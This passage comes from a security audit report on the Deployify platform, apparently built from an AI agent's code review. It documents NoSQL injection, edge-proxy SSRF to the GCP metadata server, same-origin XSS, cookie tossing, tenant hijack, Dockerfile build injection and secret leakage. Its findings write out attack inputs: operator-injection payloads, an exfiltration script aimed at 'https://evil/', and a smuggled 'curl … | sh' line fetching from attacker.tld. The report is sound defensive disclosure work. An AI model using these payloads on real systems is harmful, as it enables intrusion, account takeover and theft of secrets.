- **Failure scenario:** The public widget path (widgetId, no session — lines 35-59) forces query = widgetData.query but still applies request-supplied `variables` (line 28) to it. For a mongodb-atlas public widget whose saved query is e.g. {"collection":"orders","filter":{"userId":":uid"}}, an unauthenticated attacker POSTs {"widgetId":"<public>","variables":{"uid":{"$ne":null}}}. Because an object value is JSON.stringified and spliced into the query string, the filter becomes {"userId":{"$ne":null}}, and db.collection('orders').find(filter) returns every user's orders — a per-user filter bypass. Injecting {"$where":"sleep(5000)"} or {"$gt":""} enables blind enumeration. Output PII-masking is applied but does not restore the intended row-level scoping and leaves non-PII fields exposed.
- **Impact:** Unauthenticated NoSQL operator injection through public analytics widgets: attacker overrides the saved query's filters to read documents outside the widget's intended scope (auth/tenant filter bypass, blind extraction), from a route reachable without any session.
- **Evidence:**

```ts
} else {
    // For NoSQL/Redis, keep string replacement as they use JSON/command strings
    const sortedVarNames = Object.keys(variables).sort((a, b) => b.length - a.length);
    for (const key of sortedVarNames) {
        const val = variables[key];
        const replaceVal = typeof val === 'object' && val !== null ? JSON.stringify(val) : String(val);
        const regex = new RegExp(`:${key}\\b`, 'g');
        query = query.replace(regex, replaceVal);
    }
}
```
- **Agent says it ruled out:** Confirmed public path enforces the saved query text (line 50) but does NOT sanitize `variables`, which are read unconditionally from the body (line 28) and applied whenever query !== 'DISCOVER_SCHEMA' (line 91); confirmed the NoSQL branch (lines 123-131) uses raw string replacement rather than the parameterized handling used for SQL (lines 97-122); confirmed parsedQuery.filter is passed directly to Mongo find() (line 781); noted maskData only masks PII patterns in the response and does not re-impose the filter.

> **Coverage notes (D4):** Swept the storage query proxy and its dependencies end-to-end: src/app/api/projects/[id]/storage/[storageId]/query/route.ts (+ test), and libs cloudsql.ts, bigquery.ts, firestore-admin.ts, memorystore.ts, migrations.ts, schema-sync.ts; plus sub-routes storage/route.ts (create/patch/delete), import, ingest, apply-index, export/iac. Cross-checked getDb() (firebase.ts), checkProjectAccess (rbac.ts), maskData (masking.ts), and TeamRole (types). Ruled out YAML load injection: the only js-yaml usage (export/iac) is yaml.dump (output), never load/safeLoad. bigquery.ts uses table.insert() with a typed object (no user-controlled table/dataset name reaching a query), so no BigQuery SQL/identifier injection was found there. The SQL read-only guard correctly rejects the obvious CTE-with-DML and EXPLAIN-wrapping tricks (lines 162-167). Root causes cluster in the query route: (1) read-only enforcement is SQL-only and comment-stripping/executable-comment-blind, (2) role 'viewer' is never blocked from executing (only output-masked), (3) the 'firestore' connector type silently targets Deployify's own control-plane Firestore, and (4) NoSQL variable substitution is raw string interpolation. NOT covered in depth (time/scope): the storage sub-routes clone, branch, cutover, migrate-region, replica/*, migrations/content, migrations/rollback, sync-schema, sync, validate, remediate, diagnose, export/pdf, backups/restore — I grepped them for concatenated SQL/identifier interpolation (only apply-index hit) but did not read each line-by-line; external-sync.ts and storage-validator.ts (40KB) were only grepped, not fully read, and may merit a follow-up pass for injection via provider/region/resource-name fields flowing into GCP API URLs (e.g. memorystore/cloudsql instanceName path segments are interpolated into REST URLs without validation).


## D5. SSRF & the public edge proxy  <sub>`ssrf-proxy`</sub>

### 🔴 CRITICAL — Public edge proxy forwards the caller's Cookie/Authorization headers verbatim to a tenant-controlled origin, leaking the httpOnly deployify_session JWT
- **Location:** `src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:124`
- **Category:** `ssrf-credential-leak`
- **Failure scenario:** The route is a normal App Router handler with no auth and no host restriction, so it is reachable directly on the dashboard apex, e.g. https://deployify.io/api/v1/proxy/<slug>/<path> (src/proxy.ts only *rewrites* subdomain traffic to it at line 108; it never blocks direct apex access). setSessionCookie() in src/lib/auth.ts:117-123 sets 'deployify_session' with no Domain attribute and sameSite:'lax', so it is a host-only cookie on the apex that IS attached to a top-level GET navigation to that apex URL. Attacker signs up, creates project 'evil', deploys an app whose handler logs every inbound header, then sends a victim a link to https://deployify.io/api/v1/proxy/evil/pwn. The victim's browser attaches deployify_session; the loop above copies 'cookie' (and 'authorization') into the outbound Headers and fetch() at line 164 sends them to the attacker's Cloud Run service, which logs the raw JWT.
- **Impact:** Full account takeover of any logged-in Deployify user with one click, bypassing the httpOnly protection entirely. The JWT payload also carries the user's GitHub OAuth accessToken (createSessionToken in src/lib/auth.ts:29 embeds `accessToken`), so the attacker additionally obtains repo-scoped GitHub access for every victim.
- **Evidence:**

```ts
// Forward relevant headers
        req.headers.forEach((value, key) => {
            if (!['host', 'connection'].includes(key.toLowerCase())) {
                headers.set(key, value);
            }
        });
```
- **Agent says it ruled out:** Read the whole route file: no getSession/requireAuth/checkProjectAccess import or call anywhere in src/app/api/v1/proxy/[slug]/[[...path]]/route.ts. Grepped `rg -n 'deployify_session' src/` - only auth.ts, proxy.ts and the CLI; nothing strips it before proxying. src/proxy.ts's auth gate only covers pathnames starting with /dashboard or /new (line 155), not /api/v1/proxy. The header skip-list is exactly ['host','connection'].

### 🔴 CRITICAL — Proxy follows redirects from the tenant app with attacker-supplied headers intact, giving full SSRF to the GCP metadata server
- **Location:** `src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:164`
- **Category:** `ssrf`
- **Failure scenario:** fetchOptions omits `redirect`, so fetch defaults to 'follow'. The only SSRF guard is on the *initial* URL and is a substring test gated on NODE_ENV: line 107-108 `const isProduction = process.env.NODE_ENV === 'production'; const isLocalTarget = targetUrl.includes('localhost') || targetUrl.includes('127.0.0.1');` - it never re-checks the redirect target and does not know about 169.254.169.254, [::1], 0.0.0.0 or metadata.google.internal. Attacker deploys a project whose app answers any request with `302 Location: http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`, then requests https://deployify.io/api/v1/proxy/evil/x with the header `Metadata-Flavor: Google`. That custom header is forwarded verbatim by the loop at line 124 and, unlike cookie/authorization, is preserved by undici across the cross-origin redirect. The metadata response (application/json) is not HTML, so it falls through to line 207-211 and the raw body is returned to the attacker.
- **Impact:** Attacker reads the Cloud Run service account's OAuth access token and any other metadata (project id, instance identity JWTs, custom attributes) straight out of the HTTP response. That service account is used elsewhere in the codebase for run.googleapis.com domain mappings (src/lib/gcp/domains.ts:13-27), compute.googleapis.com load balancers (src/lib/gcp/loadbalancer.ts), Secret Manager and Firestore - i.e. full control of the Deployify GCP project and every tenant's infrastructure and secrets.
- **Evidence:**

```ts
const fetchOptions: RequestInit = {
            method,
            headers,
            cache: 'no-store',
        };
...
        const targetResponse = await fetch(targetUrl, fetchOptions);
```
- **Agent says it ruled out:** Grepped the route for 'redirect' and 'follow' - no matches, so the default 'follow' applies. Read lines 100-165 in full: the localhost check runs once on `targetUrl` before the fetch and is skipped entirely when NODE_ENV !== 'production'. No allowlist of *.run.app hosts, no DNS/IP validation, no fetch wrapper - `fetch` is the global.

### 🔴 CRITICAL — Tenant-controlled HTML is served on the Deployify apex origin with Content-Type text/html and no CSP, yielding stored XSS on the dashboard origin
- **Location:** `src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:200`
- **Category:** `cross-origin-html-injection`
- **Failure scenario:** Because the handler is reachable at https://deployify.io/api/v1/proxy/<slug>/<path> (no host check anywhere in the file, and src/proxy.ts never blocks that pathname), the attacker's own deployed application body is rendered by the browser as a document on the dashboard's own origin. Attacker deploys an app returning `<script>fetch('/api/projects').then(r=>r.json()).then(d=>fetch('https://evil/',{method:'POST',body:JSON.stringify(d)}))</script>` and lures a logged-in victim to https://deployify.io/api/v1/proxy/evil/. The script executes as same-origin JavaScript on deployify.io with the victim's session cookie automatically attached to every relative fetch.
- **Impact:** Full same-origin takeover of the dashboard: read/modify every project, exfiltrate decrypted env vars, add domains, delete projects, change billing - all as the victim, without ever needing to read the httpOnly cookie. Note also that the attacker-supplied page is served under Cache-Control:no-store but the origin has no Content-Security-Policy at all.
- **Evidence:**

```ts
responseHeaders.set('Content-Type', 'text/html');
            responseHeaders.set('Cache-Control', 'no-cache, no-store, must-revalidate');

            return new NextResponse(html, {
                status: targetResponse.status,
                headers: responseHeaders,
            });
```
- **Agent says it ruled out:** `rg -rn 'Content-Security-Policy' src/ next.config.ts` returns nothing - no CSP anywhere. src/lib/security/index.ts:123-130 and src/proxy.ts:12-18 set only nosniff/XFO/XSS-Protection/Referrer-Policy, none of which stop same-origin script execution. No sandboxing, no separate origin, no auth check on the route.

### 🟠 HIGH — All response headers from the tenant app, including Set-Cookie, are copied back to the browser on the Deployify origin
- **Location:** `src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:170`
- **Category:** `cookie-injection`
- **Failure scenario:** 'set-cookie' is not in skipHeaders. Attacker deploys an app that answers with `Set-Cookie: deployify_session=<JWT the attacker minted for their own account>; Path=/`. A victim who loads https://deployify.io/api/v1/proxy/evil/anything (a plain image/link works, the header is applied on any response) gets that cookie written for the apex host, overwriting their own session. When the victim then goes to the dashboard they are silently operating inside the attacker's account and will connect repositories, paste env secrets and add payment methods there. The same primitive works from a project subdomain with `Domain=.deployify.io`, since a cookie scoped to the parent domain is accepted from slug.deployify.io.
- **Impact:** Session fixation / cookie tossing on the primary application domain: victims are forced into an attacker-controlled session (credential and source-code theft), or arbitrary apex cookies are overwritten to break CSRF/state handling. Any tenant can do this to any Deployify user.
- **Evidence:**

```ts
const skipHeaders = ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 'x-frame-options'];
        targetResponse.headers.forEach((value, key) => {
            if (!skipHeaders.includes(key.toLowerCase())) {
                responseHeaders.set(key, value);
            }
        });
```
- **Agent says it ruled out:** Read the whole handler: no filtering of set-cookie, no cookie rewriting, no domain scoping. src/lib/auth.ts sets the session cookie with path '/' and no Domain, so a same-name host-only cookie written by this path collides with and can shadow the real one. Nothing in src/proxy.ts strips Set-Cookie from downstream responses.

### 🟠 HIGH — Project slugs are unique only per user but the edge proxy resolves them globally, allowing cross-tenant subdomain and Cloud Run service hijack
- **Location:** `src/app/api/projects/route.ts:123`
- **Category:** `broken-tenant-isolation`
- **Failure scenario:** getProjectBySlug filters on userId (src/lib/db.ts:1016-1024), so two different users can hold the identical slug. The proxy resolves hostnames with getProjectBySlugGlobal (src/lib/db.ts:673-677: `.where('slug','==',slug).limit(1)`), a query with no orderBy, which Firestore serves ordered by document id. Document ids are `proj_` + Math.random base36 (src/lib/utils.ts:20-24, src/lib/db.ts:981). Attacker creates a project named exactly like the victim's ('acme-app'), deletes and recreates it a few times until they hold a lexicographically smaller id than the victim's, and from then on https://acme-app.deployify.io (rewritten by src/proxy.ts:108 to /api/v1/proxy/acme-app/...) serves the attacker's application to the victim's users. Worse, GCP resource names are derived from the same slug: generateServiceName returns `dfy-<slug>` (src/lib/utils.ts:52-56), so the attacker's production deploy targets the victim's Cloud Run service `dfy-acme-app`, and DELETE /api/projects/<attacker project> lists and deletes every service with prefix `dfy-acme-app` (src/app/api/projects/[id]/route.ts:328-338).
- **Impact:** Cross-tenant takeover: an attacker serves arbitrary content (phishing, malware, cookie/credential harvesting) on another tenant's Deployify subdomain, overwrites that tenant's running production Cloud Run revision with their own image, reads their runtime logs (src/app/api/projects/[id]/logs/route.ts:69 uses the same `dfy-<slug>`), and can destroy their services on project deletion.
- **Evidence:**

```ts
// Check if slug already exists for this user
        const existingProject = await getProjectBySlug(session.user.id, slug);
        if (existingProject) {
            return NextResponse.json(
                { error: 'A project with this name already exists' },
```
- **Agent says it ruled out:** `rg -n "where\('slug'" src/lib/db.ts` shows only two slug queries: the global one (line 675) and the per-user one (line 1022). There is no reserved/unique slug collection, no transaction, and no uniqueness index. src/proxy.ts's reservedSubdomains list (line 96) only protects Deployify's own subdomains, not other tenants' slugs. resolveProject's numeric-suffix fallback (route.ts:65-72) widens the collision surface further.

### 🟡 MEDIUM — Unauthenticated edge proxy traffic bypasses rate limiting entirely and drives one Firestore write plus one BigQuery insert per request
- **Location:** `src/proxy.ts:101`
- **Category:** `resource-exhaustion`
- **Failure scenario:** This block returns before the rate-limit block at line 115, so every request to any project subdomain is completely unmetered. Each proxied HTML GET calls logEdgeEvent (route.ts:180), which does `db.collection(Collections.ANALYTICS_EVENTS).add(eventData)` (route.ts:45) plus a BigQuery streaming insert (route.ts:49). An attacker curls https://anyproject.deployify.io/?i=1..N in a loop and generates unbounded Firestore document writes and BigQuery inserts billed to Deployify. The apex path /api/v1/proxy/... is nominally rate limited, but the key is `${ip}:${pathname}` (line 124) with ip taken from the client-controlled first element of X-Forwarded-For (line 116), so simply varying the path or the X-Forwarded-For value defeats it. The proxy.ts rateLimitStore Map (line 21) also has no eviction - unlike src/lib/security/index.ts:39-47 which has cleanupExpiredEntries - so each unique ip:path key is retained forever.
- **Impact:** Direct financial denial-of-wallet (unbounded Firestore writes + BigQuery streaming inserts + Cloud Run egress) and memory exhaustion of the edge runtime from the ever-growing rate-limit Map; the same X-Forwarded-For spoof also defeats the strict 30/min limit intended for /api/auth/ and /api/webhooks/.
- **Evidence:**

```ts
if (subdomain && !reservedSubdomains.includes(subdomain)) {
            // Check if we are trying to access the collector API or insights script - allow it to pass through
            if (pathname.startsWith('/api/v1/collect') || pathname.startsWith('/deployify-insights.js')) {
                return NextResponse.next({
                    headers: responseHeaders,
                });
            }

            const url = request.nextUrl.clone();
            url.pathname = `/api/v1/proxy/${subdomain}${pathname}`;
            return NextResponse.rewrite(url, {
                headers: responseHeaders,
            });
```
- **Agent says it ruled out:** Read src/proxy.ts end to end: the rewrite at line 109 returns before line 115's rate-limit code, and the route handler itself imports no rate limiter (`rg -n 'checkRateLimit' src/app/api/v1/proxy` is empty). isBot() at route.ts:8-11 only skips logging for user agents that self-identify as bots, which an attacker will not do. No cleanup call exists for the Map declared at src/proxy.ts:21.

### 🟡 MEDIUM — Project webhookUrl is stored and POSTed to with no scheme/host validation, giving authenticated blind SSRF from inside the GCP project
- **Location:** `src/lib/webhooks.ts:12`
- **Category:** `ssrf`
- **Failure scenario:** PATCH /api/projects/[id] accepts 'webhookUrl' in its allowedFields list (src/app/api/projects/[id]/route.ts:136) and applies it with no validation - the validation block that follows only covers buildTimeout, autodeployBranches and resources. A user sets webhookUrl to `http://10.128.0.5:8080/admin/shutdown` (or any VPC-internal / link-local address reachable from the Cloud Run instance) and triggers a deployment; syncDeploymentStatus then calls sendWebhookNotification(webhookUrl, ...) (src/lib/deployment.ts:53-59, 242-247) and the server issues an attacker-directed POST with a JSON body from inside Deployify's network perimeter.
- **Impact:** Any signed-up user turns the Deployify backend into a request-forgery relay against internal/VPC-only services and cloud endpoints that are not otherwise reachable from the internet, and can port-scan the internal network by observing deployment timing.
- **Evidence:**

```ts
export async function sendWebhookNotification(url: string, payload: WebhookPayload): Promise<void> {
    if (!url) return;

    try {
        const response = await fetch(url, {
            method: 'POST',
```
- **Agent says it ruled out:** Read src/lib/webhooks.ts in full - no URL parsing, no protocol allowlist, no IP/DNS check. Grepped every webhookUrl write path: src/app/api/projects/[id]/route.ts:136 (PATCH allowedFields, no validation added) and the store field src/store/project-slice.ts:295. `rg -n 'validateConnectionString'` exists for env vars but is never applied to webhookUrl.

### 🟡 MEDIUM — DELETE /api/projects/[id]/domains has no owner/admin role check, so a team viewer can remove a project's custom domain mapping
- **Location:** `src/app/api/projects/[id]/domains/route.ts:207`
- **Category:** `broken-access-control`
- **Failure scenario:** checkProjectAccess returns `{allowed: true, role: membership.role}` for ANY team membership including 'viewer' (src/middleware/rbac.ts:19-21). The POST handler in this same file guards with `if (access.role !== 'owner' && access.role !== 'admin')` at lines 100-105, but the DELETE handler omits that guard entirely. A viewer-role member (or a compromised viewer account, e.g. a contractor invited for read-only log access) sends DELETE /api/projects/<id>/domains?domainId=dom_xxx and the handler calls deleteDomainMapping, tearing down the Cloud Run domain mapping for the production custom domain and dropping it from Firestore.
- **Impact:** Least-privileged team members can take a team's production custom domain offline; restoring it requires re-creating the mapping and waiting for Google-managed certificate re-issuance, so this is a durable outage, not a momentary one.
- **Evidence:**

```ts
const { project } = access;

        const { searchParams } = new URL(request.url);
        const domainId = searchParams.get('domainId');
...
        // Delete domain mapping from Cloud Run
        await deleteDomainMapping(domainToDelete.domain);
```
- **Agent says it ruled out:** Read both handlers in the same file: POST enforces owner/admin at line 100, DELETE (lines 187-250) performs only checkProjectAccess with no role comparison. Confirmed in src/middleware/rbac.ts that 'viewer' membership yields allowed:true. No secondary role check inside deleteDomainMapping (src/lib/gcp/domains.ts:70-112).

> **Coverage notes (D5):** Read end-to-end: src/proxy.ts, src/app/api/v1/proxy/[slug]/[[...path]]/route.ts, src/lib/gcp/domains.ts, src/lib/gcp/loadbalancer.ts, src/app/api/projects/[id]/domains/route.ts, src/lib/performance/lighthouse.ts, src/lib/webhooks.ts, src/lib/auth.ts, src/lib/config.ts, src/middleware/rbac.ts, src/lib/security/index.ts, next.config.ts, plus the relevant slices of src/lib/db.ts, src/lib/deployment.ts, src/lib/utils.ts and src/app/api/projects/route.ts and /[id]/route.ts.

Explicitly investigated and REJECTED as non-findings (each refutable on inspection, so not reported): (1) path traversal / absolute-URL smuggling through [[...path]] - targetUrl is built as `${baseUrl}${fullPath}` where fullPath always begins with '/', so '..', '//evil.com' and backslash payloads only alter the path component; the WHATWG URL parser has already fixed the authority and normalizes '..' back within the same origin. (2) x-frame-options being stripped at route.ts:170 - src/proxy.ts:12-18 re-applies 'X-Frame-Options: DENY' to both the rewrite and the default response, so the proxied page is not framable. (3) analytics <script> tag injection using project.analyticsApiKey (route.ts:185) - the key is server-generated and the injected tag lands only in that same project's own HTML, so there is no cross-tenant escalation beyond finding #3. (4) path injection into the Cloud Run Admin API through deleteDomainMapping/getDomainMappingStatus (src/lib/gcp/domains.ts:89,136 interpolate `domain` into the URL unencoded) - blocked because the only write path validates against the strict isValidDomain regex at src/app/api/projects/[id]/domains/route.ts:16, which forbids '/' and '.', and 'domains' is not in the PATCH allowedFields. (5) lighthouse.ts - the user URL goes into a query parameter of a fixed googleapis.com endpoint, not into the request target. (6) external-sync.ts - user-controlled segments (supabaseId, neonProjectId, organization, database) are interpolated into fixed third-party hosts using the user's own API token, so traversal there only reaches the caller's own vendor account.

NOT covered by this dimension/pass: the ~80 other API route handlers (authz sweep), the /api/v1/collect ingest endpoint and public/deployify-insights.js internals, the storage database connectors (pg/mysql2/mongodb/ioredis/BigQuery), billing webhooks, and src/lib/crypto.ts key derivation. I did not run the app or attempt live exploitation - all findings are from source reading, and the metadata-SSRF chain (finding #2) depends on undici preserving non-sensitive custom headers across a cross-origin redirect, which is the documented fetch behaviour (only authorization/cookie/proxy-authorization/host are stripped).


## D6. Webhook authenticity & billing integrity  <sub>`webhooks-billing`</sub>

### 🔴 CRITICAL — Unvalidated env-var keys are interpolated raw into the generated Dockerfile, giving any authenticated user code execution inside Deployify's shared Cloud Build project
- **Location:** `src/lib/gcp/cloudbuild.ts:137`
- **Category:** `build-injection`
- **Failure scenario:** Any signed-up user POSTs /api/projects with `envVariables: [{ key: "A\nRUN curl -s https://attacker.tld/x.sh | sh", value: "1", target: "build" }]` (or PUTs the same key onto an existing var via /api/projects/[id]/env, bypassing the POST-only regex). getEnvVarsForDeployment copies the key verbatim into buildEnvVars; cloudbuild.ts emits `ARG A\nRUN curl -s https://attacker.tld/x.sh | sh` into dockerArgDeclarations, which is interpolated into the Dockerfile template and written by the heredoc. The next deploy runs the attacker's RUN line inside the Cloud Build worker. A key containing a line equal to `EOFMARKER` escapes the heredoc entirely into the build step's bash.
- **Impact:** Arbitrary code execution in the platform's shared Cloud Build project, under the build service account that the same config uses to run `gcloud run deploy` (cloudbuild.ts:370-399) and to pull every tenant's Secret Manager connection strings. That means cross-tenant compromise: read/modify other customers' Cloud Run services, push images to the shared `deployify-images` Artifact Registry, and reach other tenants' secrets.
- **Evidence:**

```ts
src/lib/gcp/cloudbuild.ts:135-140
    Object.entries(buildEnvVars).forEach(([key, value]) => {
        dockerBuildArgs.push('--build-arg', `${key}=${value}`);
        dockerArgDeclarations.push(`ARG ${key}`);
        dockerEnvFromArgs.push(`ENV ${key}=$$${key}`);
    });

src/lib/gcp/cloudbuild.ts:144-149
    let buildEnvSection: string;
    if (dockerArgDeclarations.length > 0) {
        buildEnvSection = '# Build-time environment variables (from Docker --build-arg)\n' +
            dockerArgDeclarations.join('\n') + '\n' +
            dockerEnvFromArgs.join('\n');

src/lib/dockerfiles.ts:122  (raw template interpolation, same at :63 :179 :235)
${buildEnvSection}

src/lib/gcp/cloudbuild.ts:228-235 (heredoc that writes it)
                `if [ ! -f ${workDir}/Dockerfile ]; then cat > ${workDir}/Dockerfile << 'EOFMARKER'\n${dockerfileContent}\nEOFMARKER\nfi`

Key validation is missing on
… (truncated)
```
- **Agent says it ruled out:** Grepped for key sanitization: `isValidEnvVarKey` exists at src/lib/security/index.ts:158 but `rg -n "isValidEnvVarKey" src` returns only its definition — it is never called. POST /api/projects/[id]/env:93 is the only regex check and does not cover POST /api/projects or PUT /api/projects/[id]/env. No escaping is applied to `key` anywhere between db.ts:248 and dockerfiles.ts:122; `escapeBashArg` (cloudbuild.ts:205) is defined but not applied to the Dockerfile heredoc path.

### 🔴 CRITICAL — IaC export endpoint returns the plaintext database connection string to viewers with no role gate
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/export/iac/route.ts:40`
- **Category:** `broken-access-control`
- **Failure scenario:** A team member holding the read-only `viewer` role (TeamRole is 'owner'|'admin'|'member'|'viewer', src/types/index.ts:75) issues `GET /api/projects/<id>/storage/<storageId>/export/iac?format=env`. The handler only calls checkProjectAccess and never inspects access.role, so it fetches the connector secret from GCP Secret Manager and returns e.g. `DATABASE_URL="postgresql://app:S3cr3t@10.0.0.5:5432/prod"` as a downloadable file.
- **Impact:** Full production database credentials (Cloud SQL / Supabase / PlanetScale / MongoDB Atlas / Redis) are handed to a principal the product explicitly treats as read-only, defeating the entire Secret Manager design. The attacker gets direct network-level DB access outside every guardrail (query masking, audit logging, row limits) the app applies.
- **Evidence:**

```ts
src/app/api/projects/[id]/storage/[storageId]/export/iac/route.ts:22-40
        const access = await checkProjectAccess(session.user.id, id);
        if (!access.allowed) {
            return NextResponse.json({ error: access.error }, { status: access.status });
        }
        const { project } = access;
        const storage = project.storageConfigs?.find(s => s.id === storageId);
        ...
        let connectionString = '';
        if (storage.connectionStringSecretId) {
            connectionString = await getSecretValue(storage.connectionStringSecretId) || '';
        }

...:139-148 (default `json` format)
                content = JSON.stringify({
                    id: storage.id,
                    ...
                    connectionString,

...:115-118 (`env` format)
                content += `${envKey}="${connectionString}"\n`;
```
- **Agent says it ruled out:** Every sibling route under the same directory has the gate — export/route.ts:30, rotate/route.ts:29, clone/route.ts:27, import/route.ts:30, ingest/route.ts:23, cutover/route.ts:23, audit/route.ts:29, apply-index/route.ts:32 all contain `if (access.role === 'viewer')`; replica routes require owner/admin. query/route.ts:943 even masks results for viewers (`const shouldMask = widgetId || access?.role === 'viewer'`). `grep -c viewer` on export/iac/route.ts returns 0. There is no proxy-level or middleware role check either (src/proxy.ts does session/edge work only).

### 🟠 HIGH — Decrypted GitHub OAuth access token is embedded in a Cloud Build step argument and persisted in build history
- **Location:** `src/lib/gcp/cloudbuild.ts:505`
- **Category:** `secret-exposure`
- **Failure scenario:** Any push to a connected private repo triggers submitCloudBuild with this config. The token is stored verbatim inside `build.steps[0].args[1]` in the Cloud Build API for the platform's GCP project and is returned in cleartext by `gcloud builds describe <id>` / `cloudbuild.builds.get` to every principal with the Cloud Build Viewer role, for the full retention life of the build record. It is also visible to any process inside that build step via /proc and to the build's own workspace.
- **Impact:** A GitHub user OAuth token with the app's full granted scopes (repo access to everything that user can reach, not just this project) is stored in cleartext in shared platform infrastructure. Anyone with Cloud Build read access — a support engineer, a CI service account, or an attacker who achieves the build-time RCE described in the Dockerfile-injection finding — harvests every customer's GitHub token at once. Careful design elsewhere (AES-GCM at rest, Secret Manager for DB creds) is nullified.
- **Evidence:**

```ts
src/lib/gcp/cloudbuild.ts:496-507
    if (gitToken) {
        return {
            steps: [
                {
                    name: 'gcr.io/cloud-builders/git',
                    entrypoint: 'bash',
                    args: [
                        '-c',
                        `git clone https://x-access-token:${gitToken}@github.com/${repoFullName} . && git checkout ${commitSha}`,
                    ],
                },

gitToken is the user's real OAuth token, decrypted immediately before:
src/app/api/webhooks/github/route.ts:164   const gitToken = project.githubToken ? decrypt(project.githubToken) : undefined;
src/app/api/webhooks/github/route.ts:559   const gitToken = project.githubToken ? decrypt(project.githubToken) : undefined;
src/app/api/projects/[id]/deploy/route.ts:169   const projectGitToken = project.githubToken ? decrypt(project.githubToken) : undefined;
and it or
… (truncated)
```
- **Agent says it ruled out:** Checked whether Cloud Build's own secret plumbing is used: the same file uses `--set-secrets` for storage connectors (cloudbuild.ts:388) and computes `secretResourceNames` for IAM binding (cloudbuild.ts:197-209), so availableSecrets/Secret Manager was clearly available and simply not used for the git token. Grepped `rg -n "availableSecrets|secretEnv" src` — no hits. No redaction of the token before JSON.stringify at cloudbuild.ts:569.

### 🟠 HIGH — Full database connection strings (with passwords) are written to application logs during PR-close cleanup
- **Location:** `src/app/api/webhooks/github/route.ts:338`
- **Category:** `secret-in-logs`
- **Failure scenario:** A tenant with a MongoDB Atlas or Memorystore Redis connector and branching enabled closes a pull request. GitHub delivers the `pull_request: closed` webhook; the handler pulls the raw secret out of Secret Manager and console.logs it in full — e.g. `[Cleanup] Dropping ephemeral MongoDB database at mongodb+srv://appuser:Pa55w0rd@cluster0.abcd.mongodb.net/pr42`. On Cloud Run that stdout line lands in Cloud Logging.
- **Impact:** Live production/preview database credentials are copied out of Secret Manager into Cloud Logging, where they are retained (30 days by default in the _Default bucket), exported to any configured log sink/SIEM, and readable by every principal holding roles/logging.viewer on the platform project — a far broader and less-audited audience than roles/secretmanager.secretAccessor. Nothing in the app can revoke a credential once it is in the log stream.
- **Evidence:**

```ts
src/app/api/webhooks/github/route.ts:321-338
                            const baseConnectionString = storage.connectionStringSecretId
                                ? await getSecretValue(storage.connectionStringSecretId)
                                : null;
                            ...
                            const branchedConnectionString = getBranchConnectionString(
                                baseConnectionString,
                                storage.type,
                                storage.branchingSettings,
                                { pullRequestNumber: pull_request.number }
                            );

                            console.log(`[Cleanup] Flushing ephemeral Redis DB at ${branchedConnectionString}`);

src/app/api/webhooks/github/route.ts:375
                            console.log(`[Cleanup] Dropping ephemeral MongoDB database at ${bra
… (truncated)
```
- **Agent says it ruled out:** Checked for a redaction helper on this path: src/lib/utils/masking.ts exports maskString/maskData (which do mask `password`-ish object keys and would have helped), but `rg -n "maskString|maskData" src/app/api/webhooks` returns nothing — they are only used by the Data Lab query path. The adjacent Firestore branch (line 310) deliberately logs only `databaseId`, and seeding.ts:107/115 deliberately logs only `connectionString.split('@')[1]`, so the codebase knows to strip credentials — these two call sites do not.

### 🟠 HIGH — Single sha256-derived key with silent JWT_SECRET fallback and no key version makes secret-key rotation impossible without total data loss
- **Location:** `src/lib/crypto.ts:21`
- **Category:** `weak-key-management`
- **Failure scenario:** Two concrete failures. (1) Rotation: an operator who deployed without setting ENCRYPTION_KEY (config.validateConfig() only warns, config.ts:99-101) rotates JWT_SECRET after a session-forgery scare. Every stored ciphertext was produced under sha256(old JWT_SECRET). getEnvVarsForDeployment (src/lib/db.ts:237-243) then throws `Failed to decrypt secret <KEY>` for every project with a secret env var, so all deploys fail; webhooks/github/route.ts:164 `decrypt(project.githubToken)` throws, so every private-repo push webhook 500s. Because the `enc:` envelope has no key identifier, there is no dual-key/decrypt-with-old-then-re-encrypt path and no rotation script exists — the only recovery is asking every customer to re-enter every secret. (2) Blast radius: one leak of JWT_SECRET (from a log, a container inspect, or a stale .env) simultaneously lets an attacker mint arbitrary `deployify_session` JWTs and decrypt every stored env secret and GitHub token, because the signing key and the encryption key are the same bytes.
- **Impact:** The platform cannot perform routine key rotation — the single most basic incident-response action — without destroying every customer's stored secrets and breaking all deployments. Key reuse across two primitives (HS256 signing and AES-256-GCM data encryption) collapses two separate compromises into one. Additionally the key is a raw sha256 of an operator-chosen string with no salt and no KDF (no PBKDF2/scrypt/HKDF), so a short or low-entropy JWT_SECRET is directly brute-forceable offline against any single captured ciphertext.
- **Evidence:**

```ts
src/lib/config.ts:59-61
    security: {
        ...
        encryptionKey: process.env.ENCRYPTION_KEY || process.env.JWT_SECRET,
    },
src/lib/config.ts:43-46
    jwt: {
        secret: process.env.JWT_SECRET!,

src/lib/crypto.ts:4,21,56
const ENCRYPTION_KEY = config.security.encryptionKey;
    const key = crypto.createHash('sha256').update(ENCRYPTION_KEY).digest();   // encrypt
    const key = crypto.createHash('sha256').update(ENCRYPTION_KEY).digest();   // decrypt

src/lib/crypto.ts:30 — the envelope carries no key id:
    return `enc:${iv.toString('hex')}:${tag.toString('hex')}:${encrypted}`;

src/lib/auth.ts:10 — the same value signs sessions:
const getSecret = () => new TextEncoder().encode(config.jwt.secret);
```
- **Agent says it ruled out:** Grepped `rg -n "ENCRYPTION_KEY" src scripts` — the only references are config.ts:60/99-100 and crypto.ts; there is no rotation utility, no key-id field, and no second key. `ls scripts` shows no re-encryption migration (migrate-api-keys.js is unrelated to crypto keys). env.example:41-43 documents ENCRYPTION_KEY as optional-looking (`# Generate a 32-byte key`) while config.ts silently substitutes JWT_SECRET when it is absent, so the dangerous configuration is the default one.

### 🟡 MEDIUM — Build-time secrets are baked into image ENV layers, surviving rotation and deletion
- **Location:** `src/lib/gcp/cloudbuild.ts:140`
- **Category:** `secret-exposure`
